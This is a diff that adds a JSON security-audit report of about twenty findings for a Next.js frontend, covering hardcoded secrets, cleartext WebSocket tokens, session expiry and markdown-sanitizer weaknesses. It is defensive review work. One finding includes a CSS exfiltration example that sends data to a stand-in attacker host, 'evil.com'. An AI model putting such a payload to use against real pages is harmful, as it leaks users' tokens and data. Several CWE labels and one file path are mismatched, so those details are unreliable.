@@ -1,0 +1,204 @@
+{
+  "findings": [
+    {
+      "severity": "CRITICAL",
+      "title": "Hardcoded cookie encryption secret fallback",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\auth0.ts",
+      "line": 7,
+      "description": "The AUTH0_COOKIE_SECRET fallback is a static, hardcoded string 'a-very-long-secret-key-of-at-least-32-characters'. If the environment variable is not set (e.g., in dev or due to misconfiguration), this literal becomes the session cookie encryption key. This is a well-known string that could be discovered from source code, enabling an attacker to forge or decrypt session cookies at will.",
+      "impact": "Complete session impersonation. An attacker who knows this string can forge arbitrary session cookies, impersonate any user, read existing sessions, and gain unauthorized access to the application with any user's privileges.",
+      "fix": "Remove the fallback string entirely. Instead, throw a descriptive error at application startup if AUTH0_COOKIE_SECRET is not set. Use a runtime validation check: if (!process.env.AUTH0_COOKIE_SECRET) throw new Error('AUTH0_COOKIE_SECRET is required'). Ensure the secret is at least 32 characters and generated via openssl rand -hex 32.",
+      "cwe": "CWE-798: Use of Hard-coded Credentials"
+    },
+    {
+      "severity": "CRITICAL",
+      "title": "Authentication token transmitted over unencrypted WebSocket",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\websocket.ts",
+      "line": 44,
+      "description": "The WebSocket connection URL defaults to 'ws://localhost:8000' (plain WebSocket, not secure WSS). The Auth0 access token is passed as a subprotocol header 'auth.{token}' in the HTTP Upgrade handshake. Over an unencrypted ws:// connection, both the handshake headers and all subsequent messages (which contain ThreatAlert data) are transmitted in cleartext. An attacker on the same network (WiFi, LAN) can capture the token and all WebSocket traffic.",
+      "impact": "Authentication token theft, session hijacking, and exposure of all real-time threat data, enrichment data (Splunk, VirusTotal), and internal system information transmitted over the WebSocket connection.",
+      "fix": "Change the default to 'wss://localhost:8000' (secure WebSocket). In production, enforce wss:// with no fallback to ws://. Add a validation check that rejects non-TLS WebSocket URLs in non-local environments. Use a .env validation: if (typeof window !== 'undefined' && process.env.NEXT_PUBLIC_WS_URL?.startsWith('ws://') && !location.hostname.includes('localhost')) { console.error('Insecure WebSocket'); }",
+      "cwe": "CWE-319: Cleartext Transmission of Sensitive Information"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Missing absolute session timeout (no maxAge)",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\auth0.ts",
+      "line": 12,
+      "description": "The session config sets only a rollingDuration of 24 hours but no absoluteDuration/maxAge. With rolling sessions, the 24-hour window resets on every request. A user who sends a request every 23 hours stays logged in indefinitely. For a cybersecurity application, unlimited session longevity is a critical risk.",
+      "impact": "Session never expires for active users. A stolen session cookie remains valid indefinitely as long as the attacker uses it before the 24-hour rolling window closes each time. Compromised accounts stay accessible forever.",
+      "fix": "Add an absoluteDuration (maxAge) of 8 hours at most. session: { rollingDuration: 60 * 60 * 8, absoluteDuration: 60 * 60 * 8 }. This enforces re-authentication after 8 hours regardless of activity. For sensitive operations (siem, scans, threat analysis), consider shorter durations.",
+      "cwe": "CWE-613: Insufficient Session Expiration"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Dead code passes token in WebSocket URL query parameter",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\websocket.ts",
+      "line": 79,
+      "description": "The buildWsUrl() method appends the authentication token directly to the WebSocket URL as a query parameter (?token=<jwt>). While this method is currently unreferenced dead code, its mere presence creates a maintenance hazard, and the design pattern it implements is inherently dangerous. If any future code path calls this method (or if a developer copies this pattern), the token would be exposed in server access logs, browser history, referer headers, and proxy logs.",
+      "impact": "If ever invoked, the JWT token would leak into HTTP server logs, browser history, and Referer headers — all persistent storage with broad access surfaces. Token theft via this vector grants full API access as the impersonated user.",
+      "fix": "Delete the buildWsUrl() method entirely. Remove dead code that contains security-sensitive patterns to prevent future misuse. If query-parameter-based auth is needed for legacy compat, use a short-lived one-time token or HMAC, never the long-lived access token.",
+      "cwe": "CWE-200: Exposure of Sensitive Information"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Wildcard attribute '*' allows 'id' on all HTML elements enabling DOM clobbering",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\components\\markdown\\SecureMarkdown.tsx",
+      "line": 24,
+      "description": "The rehype-sanitize allowedAttributes configuration includes '*': ['class', 'id']. The wildcard '*' permits 'class' and 'id' on ALL allowed elements including 'div' and 'span'. The 'id' attribute enables DOM clobbering attacks where an attacker-controlled markdown element can override JavaScript global variables (e.g., <span id='user'> or <div id='config'>) by creating named properties on the window object or form element collections. This bypasses the purpose of the sanitizer.",
+      "impact": "DOM clobbering can override JavaScript variables used for authentication checks, access control decisions, or security-sensitive logic. An attacker who can submit markdown content could override variables like window.admin, window.config, or form references to subvert application logic.",
+      "fix": "Remove 'id' from the wildcard allowedAttributes: change '*' to only allow ['class'] or remove the wildcard entirely and enumerate per-tag attributes. If 'id' must be allowed on specific elements, list them explicitly (e.g., h1: ['id'] for anchor links). For the '*' wildcard, use only ['class'] at most.",
+      "cwe": "CWE-84: Improper Resolution of Path Equivalence"
+    },
+    {
+      "severity": "HIGH",
+      "title": "Default API URL uses HTTP not HTTPS",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\api.ts",
+      "line": 4,
+      "description": "The NEXT_PUBLIC_API_URL fallback is 'http://localhost:8000' using unencrypted HTTP. While acceptable for local development, this environment variable is prefixed with NEXT_PUBLIC_ which means it is compiled into the client-side JavaScript bundle at build time. If the build artifact is ever deployed to a staging or production environment without overriding this variable, all API traffic including authentication tokens in Authorization headers would be transmitted in cleartext.",
+      "impact": "If accidentally deployed without proper env var override, all API requests (including Bearer tokens in Authorization headers, user data, scan results, threat intelligence) are transmitted in cleartext HTTP, enabling Man-in-the-Middle interception of all application data and session tokens.",
+      "fix": "Change the fallback to use https: process.env.NEXT_PUBLIC_API_URL || 'https://localhost:8000'. Add a runtime check that warns in production if the URL uses http://. Consider using a server-side proxy instead of client-side API calls to avoid exposing the base URL entirely.",
+      "cwe": "CWE-319: Cleartext Transmission of Sensitive Information"
+    },
+    {
+      "severity": "HIGH",
+      "title": "useEffect dependency array causes WebSocket re-initialization on alert selection",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\websocket.ts",
+      "line": 171,
+      "description": "The useWebSocket hook's useEffect dependency array includes 'selectedAlert'. When a user selects a different alert, the entire effect cleanup runs (unsubscribing handlers and clearing the interval) and re-runs, re-calling initWs() which calls getSession() and wsManager.connect(). While connect() has an early-return guard for OPEN connections, the handler subscription lifecycle is unnecessarily churned and getSession() is called on every selection change. This creates unnecessary overhead and could trigger race conditions with the interval-based connection status polling.",
+      "impact": "Unnecessary getSession() calls on every alert selection increase attack surface for token handling race conditions. The defunct handler unsubscription/re-subscription pattern could drop messages during the transition. In slower environments this could cause missed real-time threat alerts.",
+      "fix": "Remove 'selectedAlert' from the useEffect dependency array. The selectedAlert state is only used inside the effect for the initial auto-select logic (line 153-155). That logic should be moved to a separate effect or handled via a callback. The WebSocket init effect should have an empty dependency array (run once on mount).",
+      "cwe": "CWE-821: Incorrect Synchronization"
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "offline_access scope enables long-lived refresh tokens without rotation policy",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\auth0.ts",
+      "line": 21,
+      "description": "The authorization scope includes 'offline_access' which causes Auth0 to issue refresh tokens. These tokens enable obtaining new access tokens without user re-authentication. However, the code does not implement refresh token rotation (the old refresh token remains valid after being used). If a refresh token is stolen, it can be used indefinitely to generate new access tokens.",
+      "impact": "A stolen refresh token grants persistent API access. The attacker can continuously generate new access tokens even after the original access token expires, without the user needing to re-authenticate. The session remains compromised until the application's Auth0 tenant is manually reconfigured.",
+      "fix": "If offline_access is truly needed, enable Refresh Token Rotation in Auth0 dashboard (which invalidates old refresh tokens when new ones are issued). Also set an absolute refresh token expiration. Alternatively, remove the 'offline_access' scope if long-lived sessions are not required.",
+      "cwe": "CWE-613: Insufficient Session Expiration"
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "No CSRF protection headers on Axios requests",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\api.ts",
+      "line": 14,
+      "description": "The Axios client does not include any CSRF protection mechanism such as X-CSRF-Token headers or SameSite cookie enforcement from the client side. If a cross-site request forgery vulnerability exists on the backend, there are no client-side CSRF countermeasures. The 'Content-Type: application/json' header provides some protection against simple form-based CSRF, but custom XHR requests from other origins can still include this header.",
+      "impact": "If the backend does not validate CSRF tokens, an attacker could trick an authenticated user's browser into making API requests to the application, performing actions on their behalf (creating scans, accessing threat data, triggering n8n workflows).",
+      "fix": "Add CSRF token logic to the Axios interceptor. Either fetch a CSRF token from a dedicated endpoint and include it in X-CSRF-Token headers, or rely on SameSite cookie attributes (set cookie.sameSite: 'strict' or 'lax'). For the Axios layer, add a request interceptor that injects a CSRF header from a cookie set by the backend.",
+      "cwe": "CWE-352: Cross-Site Request Forgery"
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "Wildcard attribute '*' allows 'class' on all elements enabling CSS injection",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\components\\markdown\\SecureMarkdown.tsx",
+      "line": 24,
+      "description": "The rehype-sanitize configuration allows 'class' on all HTML elements via the '*' wildcard. An attacker who can control markdown content can inject HTML classes that exploit existing CSS rules for data exfiltration. CSS injection can be used to read attribute values, detect user interactions, or extract CSRF tokens via CSS selectors and background-image URL callbacks. While less critical than JavaScript XSS, CSS injection is a real attack vector.",
+      "impact": "Data exfiltration via CSS attribute selectors (e.g., input[value^='secret'] { background: url('https://evil.com/?c=secret') }). An attacker could read CSRF tokens, email addresses, or other attribute-stored values from the rendered page.",
+      "fix": "Remove the wildcard and enumerate class allowlisting per element type. If generic class passthrough is required, implement a prefix-based allowlist (e.g., only allow classes matching 'prose-*' or 'markdown-*'). Alternatively, strip the wildcard attribute entirely and only allow class on specific elements like code and pre (for syntax highlighting).",
+      "cwe": "CWE-79: Improper Neutralization of Input During Web Page Generation"
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "div and span elements allowed in markdown sanitizer bypassing some XSS protections",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\components\\markdown\\SecureMarkdown.tsx",
+      "line": 20,
+      "description": "The DEFAULT_ALLOWED_ELEMENTS includes 'div' and 'span'. These generic block/inline containers provide attackers with the ability to structure arbitrary content. Combined with the wildcard 'class' and 'id' attributes, an attacker can inject elements that interfere with the page layout, apply malicious CSS styling via pre-existing classes, or create DOM clobbering targets. While the sanitizer blocks event handlers and javascript: URIs, div/span provide a broader attack surface than necessary.",
+      "impact": "Attackers can inject div/span elements with arbitrary id/class values enabling DOM clobbering, CSS injection attacks, and layout manipulation that could be used for phishing or UI redressing.",
+      "fix": "Remove 'div' and 'span' from DEFAULT_ALLOWED_ELEMENTS unless they are specifically needed. If generic containers are required for layout in markdown output, limit them to a single specific element type (e.g., only 'div' but with restricted attributes). Document why they are needed.",
+      "cwe": "CWE-79: Improper Neutralization of Input During Web Page Generation"
+    },
+    {
+      "severity": "MEDIUM",
+      "title": "any type used on endpoints accepting user data for analysis and workflow triggers",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\api.ts",
+      "line": 113,
+      "description": "The analyzeThreat and triggerN8n endpoint methods accept 'data: any' parameters, completely bypassing TypeScript type checking. This means any arbitrary object can be sent to these endpoints at compile time. The chat method sends user-controlled query and context strings. If the backend uses these values in vulnerable ways (e.g., injection into system commands or LLM prompts), the type bypass eliminates the type-level guard rail.",
+      "impact": "Without type enforcement, developers can inadvertently send malformed or malicious data to backend endpoints that trigger n8n workflows or perform threat analysis. The triggerN8n endpoint is particularly concerning as it dispatches actions to external workflow systems.",
+      "fix": "Define specific interface types for each endpoint's request body. For analyzeThreat and triggerN8n, create proper typed interfaces. Example: interface AnalyzeThreatPayload { attack_type: string; industry?: string; region?: string; raw_data?: string; }. For the chat endpoint, consider input validation on the client side.",
+      "cwe": "CWE-20: Improper Input Validation"
+    },
+    {
+      "severity": "LOW",
+      "title": "Long rolling session duration (24 hours) for security application",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\auth0.ts",
+      "line": 13,
+      "description": "The session rollingDuration is set to 86400 seconds (24 hours). For a cyber-threat intelligence application with access to sensitive scan data, threat analysis, and workflow triggers, a 24-hour sliding session window is excessive. Combined with the missing absoluteDuration, sessions can persist indefinitely for active users.",
+      "impact": "Users who forget to log out on shared workstations leave their session accessible for up to 24 hours. An unauthorized person using the same machine can access threat intelligence, initiate scans, and trigger workflows without re-authentication.",
+      "fix": "Reduce the rollingDuration to 4 hours (14400 seconds) for a security application. Add an absoluteDuration of 8 hours maximum. This aligns with typical enterprise security session policies.",
+      "cwe": "CWE-613: Insufficient Session Expiration"
+    },
+    {
+      "severity": "LOW",
+      "title": "Non-functional fallback Auth0 domain string could mask misconfiguration",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\auth0.ts",
+      "line": 3,
+      "description": "The AUTH0_DOMAIN environment variable fallback is the placeholder string 'your-tenant.auth0.com'. This is not a valid Auth0 domain. If the environment variable is not configured, the application will silently attempt to use this invalid domain, leading to authentication failures that are harder to diagnose than an explicit startup error.",
+      "impact": "Silent authentication failures in production when environment variables are misconfigured. Users will see generic login errors without clear indication that the domain is unconfigured.",
+      "fix": "Remove the fallback string. Use process.env.AUTH0_DOMAIN without a fallback and add a validation check: if (!process.env.AUTH0_DOMAIN) throw new Error('AUTH0_DOMAIN environment variable must be set').",
+      "cwe": "CWE-754: Improper Check for Unusual or Exceptional Conditions"
+    },
+    {
+      "severity": "LOW",
+      "title": "No exponential backoff in WebSocket reconnection logic",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\websocket.ts",
+      "line": 66,
+      "description": "The WebSocket reconnection uses a fixed delay of 3000ms regardless of how many reconnection attempts have been made. With 5 max attempts, this means 5 rapid connection attempts at 3-second intervals (total 15 seconds). This can overwhelm the server during a restart or crash scenario and does not follow best practices for network reconnection patterns.",
+      "impact": "If the WebSocket server is restarting or temporarily unreachable, the client fires connection attempts at 3-second intervals (5 total). Combined with multiple clients, this creates a thundering herd problem that could delay server recovery.",
+      "fix": "Implement exponential backoff: setTimeout(() => this.connect(this.token), Math.min(1000 * Math.pow(2, this.reconnectAttempts), 30000)). Add jitter: delay += Math.random() * 1000. This gives delays of ~2s, 4s, 8s, 16s, 30s which is much more network-friendly.",
+      "cwe": "CWE-821: Incorrect Synchronization"
+    },
+    {
+      "severity": "LOW",
+      "title": "No custom reconnect logic for expired tokens during reconnection",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\websocket.ts",
+      "line": 66,
+      "description": "When reconnecting, the WebSocketManager reuses the original token captured during the initial connect() call (this.token). If the connection drops and attempts to reconnect after the Auth0 access token has expired (typically 1 hour for Auth0 access tokens), the reconnection will use a stale/expired token. All reconnection attempts will fail authentication.",
+      "impact": "After token expiration, reconnection attempts fail silently. The user must manually refresh the page or use the resume() function to get a fresh token. This could cause extended periods of missed real-time threat alerts.",
+      "fix": "Before reconnecting, attempt to refresh the token using getSession() or a token refresh mechanism. Modify the reconnect logic to call a async token refresh function before calling this.connect(). Store a tokenRefresh function instead of a static token.",
+      "cwe": "CWE-703: Improper Check for Unusual or Exceptional Conditions"
+    },
+    {
+      "severity": "LOW",
+      "title": "NEXT_PUBLIC_ prefix exposes API base URL in client bundle",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\api.ts",
+      "line": 4,
+      "description": "The API_URL variable uses NEXT_PUBLIC_API_URL, which means the value is baked into the client-side JavaScript bundle at build time. Anyone with access to the built JavaScript files can see the API base URL. While API base URLs are not secrets per se, exposing them makes the attack surface clearer: attackers know exactly where to direct API requests.",
+      "impact": "Low severity on its own, but contributes to information disclosure. Attackers can easily identify the backend API endpoint without needing to analyze network traffic.",
+      "fix": "If the API runs on the same origin (same domain), use a relative URL (/api) instead of an absolute URL. If on a different domain, consider using a Next.js API route proxy (/pages/api/proxy.ts) that forwards requests server-side, keeping the backend URL server-side only.",
+      "cwe": "CWE-200: Exposure of Sensitive Information"
+    },
+    {
+      "severity": "LOW",
+      "title": "baseURL parameter name mismatched with environment variable name",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\auth0.ts",
+      "line": 9,
+      "description": "The environment variable is named AUTH0_POST_LOGOUT_REDIRECT_URI but is assigned to the 'baseURL' Auth0 SDK configuration parameter, not the postLogoutRedirectUri parameter. These are different configuration options. Additionally, no postLogoutRedirectUri is explicitly set, so the SDK will use a default value. The variable name suggests the developer confused these two parameters.",
+      "impact": "The post-logout redirect behavior is not explicitly configured. Users may be redirected to an unexpected or default Auth0 logout page after signing out. In some configurations this could be exploited for open redirect if the default redirect is not hardened.",
+      "fix": "Separate the concerns: set baseURL: process.env.AUTH0_BASE_URL || 'http://localhost:3000' and postLogoutRedirectUri: process.env.AUTH0_POST_LOGOUT_REDIRECT_URI. Configure both explicitly.",
+      "cwe": "CWE-477: Use of Obsolete Functions"
+    },
+    {
+      "severity": "LOW",
+      "title": "No message content validation on WebSocket dispatch",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\websocket.ts",
+      "line": 55,
+      "description": "The dispatch method routes message data directly to registered handlers without any validation or schema checking. The message.type is used as a Map key, and message.data is passed through unmodified. If the WebSocket server is compromised or sends malformed messages, all registered handlers receive potentially malicious data. The handlers in useWebSocket call setAlerts directly with the received data.",
+      "impact": "Malformed or malicious data from the WebSocket server flows directly into React state. If downstream components render this data unsafely (e.g., via dangerouslySetInnerHTML), it could lead to XSS. Valid JSON parsing does not protect against semantic attacks.",
+      "fix": "Add Zod or io-ts schema validation to the dispatch path. Validate that message.type is a known, expected string and that message.data conforms to the expected ThreatAlert schema before dispatching to handlers. Reject or sanitize messages that don't match the schema.",
+      "cwe": "CWE-20: Improper Input Validation"
+    },
+    {
+      "severity": "LOW",
+      "title": "Console error logging in catch blocks may obscure attack indicators",
+      "file": "D:\\CyberOracle-Enterprise\\frontend\\src\\lib\\.ts",
+      "line": 56,
+      "description": "Multiple catch blocks across api.ts (line 25-27), websocket.ts (lines 56-58, 70-72, 74-76, 144-146, 189-190) use silent catch or console.error without propagating errors or providing user-visible feedback. In api.ts line 25-27, authentication failures are silently swallowed (empty catch block). In websocket.ts lines 56-58, parse errors are only logged to console. This obfuscates security-relevant errors from users and operators.",
+      "impact": "Users are not informed when their session token fails authentication or when WebSocket messages arrive malformed. An attacker probing the application would not trigger any user-visible warnings, making reconnaissance harder to detect for the user.",
+      "fix": "Provide user-visible feedback for critical errors (e.g., set a connection error state in the UI). For authentication errors, consider showing a 'Session expired, please refresh' message rather than silently retrying.",
+      "cwe": "CWE-778: Insufficient Logging"
+    }
+  ]
+}
